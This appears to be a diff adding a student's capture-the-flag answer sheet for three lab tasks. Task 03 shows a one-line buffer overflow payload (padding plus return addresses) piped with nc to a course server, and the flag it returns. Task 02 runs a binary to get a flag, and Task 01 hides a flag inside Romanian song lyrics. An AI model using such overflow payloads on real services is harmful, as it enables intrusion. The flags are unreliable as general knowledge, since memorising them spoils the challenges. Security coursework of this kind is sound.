@@ -1,0 +1,27 @@
+================================= Task 03 - SpeishFlag ==============================
+
+vladutmargineanu@vladutmargineanu15:~/Desktop/TSSC_labs/Tema01_TSSC/nicolae.margineanu/task1$ python2 -c 'print (64 * "A" + "\x1b\x86\x04\x08" + "\x90\x84\x04\x08" + "\x1b\x37\x33\x11")' | nc isc2021.root.sx 10027
+Welcome to the Saint Tropez Virtual Casino!
+Please enter your bank account:
+https://www.youtube.com/watch?v=pOyK9qQpdyQ SpeishFlag{uUjwSsP9sPwvtoQMQ0r8a4LLoLFz98H1}
+
+Program exited with 0
+
+
+
+================================= Task 02 - SpeishFlag ==============================
+
+parlit@fhunt:/usr/share/vim/talent$ ./indestructibil ba883b3e4e746053e80072d4601199f9
+SpeishFlag{VZfczmD7PW6Pz3V2Px8j4VmtLtZ0Jafe}
+
+
+
+
+================================= Task 01 - SpeishFlag ==============================
+Iar am pus-o, iar am pus-o
+Va dau clasa si v-am spus-o
+Iar am pus-o si am s-o pun
+SpeishFlag{BEHvxVgaFZIuH77IFuECu5YJXDFffQCX}
+Ca sa ma stiti de jupan.
+
+
